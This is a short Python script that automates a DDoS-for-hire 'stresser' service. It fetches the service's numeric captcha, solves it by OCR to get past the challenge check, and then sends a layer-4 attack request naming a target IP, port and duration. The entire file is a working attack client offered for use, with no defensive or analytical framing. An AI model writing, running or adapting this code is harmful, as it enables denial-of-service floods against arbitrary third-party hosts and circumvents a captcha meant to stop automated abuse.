import os
import easyocr
import requests

class Stresser:
    def __init__(self):
        self.session = requests.Session()
    
    def get_captcha(self, id):
        res = self.session.get(f"https://stresserst.su/challenge/image.php?refresh={id}")
        if not os.path.exists("captcha"):
            os.makedirs("captcha")
        with open("captcha/captcha.png", "wb") as f:
            f.write(res.content)
    
    def ocr(self, id):
        self.get_captcha(id)
        reader = easyocr.Reader(["en"], gpu=True)
        result = reader.readtext("captcha/captcha.png", allowlist="0123456789")
        return result[0][1]

    def bypass_check(self):
        data = {
            "req": "challenge",
            "captcha_answer": self.ocr(1)
        }
        res = self.session.post("https://stresserst.su/apiv2/api.php", data=data)
        return res.json()["data"]
    
    def layer4(self, ip, port, length):
        data = {
            "req": "l4",
            "host": ip,
            "port": port,
            "time": length,
            "captcha_answer": self.ocr(0)
        }
        res = self.session.post("https://stresserst.su/apiv2/api.php", data)
        return res.json()["data"]

if __name__ == "__main__":
    stresser = Stresser()
    print(stresser.bypass_check())
    print(stresser.layer4("ip", "port", "length"))